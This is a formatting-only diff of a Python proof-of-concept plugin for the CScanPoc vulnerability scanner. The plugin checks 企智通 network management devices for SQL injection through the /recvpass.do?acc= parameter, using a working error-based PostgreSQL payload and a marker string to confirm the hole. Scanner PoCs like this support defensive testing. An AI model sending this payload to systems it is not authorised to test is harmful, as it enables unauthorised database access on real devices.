@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = 'QZT360_0003' # 平台漏洞编号，留空
+    vuln_id = 'QZT360_0003'  # 平台漏洞编号，留空
     name = ' 企智通系列上网行为管理设备 通用型SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2015-09-09'  # 漏洞公布时间
     desc = '''
         企智通系列上网行为管理设备 /recvpass.do?acc= 存在SQL注入漏洞。
@@ -17,6 +18,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = '企智通上网行为管理设备'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '4d60588b-cc01-42bc-9e9e-ba298f06960c'
@@ -30,12 +32,12 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #refer: http://www.wooyun.org/bugs/wooyun-2015-0139442
+
+            # refer: http://www.wooyun.org/bugs/wooyun-2015-0139442
             payload = '/recvpass.do?acc=adminaaa%27%20AND%207798=CAST((CHR(113)||CHR(118)||CHR(107)||CHR(113)||CHR(113))||(SELECT%20(CASE%20WHEN%20(7798=7798)%20THEN%201%20ELSE%200%20END))::text||(CHR(113)||CHR(106)||CHR(107)||CHR(106)||CHR(113))%20AS%20NUMERIC)%20AND%20%27slur%27=%27slur&mail=admin@a.com&usbkey='
             verify_url = self.target + payload
             req = requests.get(verify_url)
-            
+
             if req.status_code == 200 and 'qvkqq1qjkjq' in req.content:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
@@ -45,6 +47,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
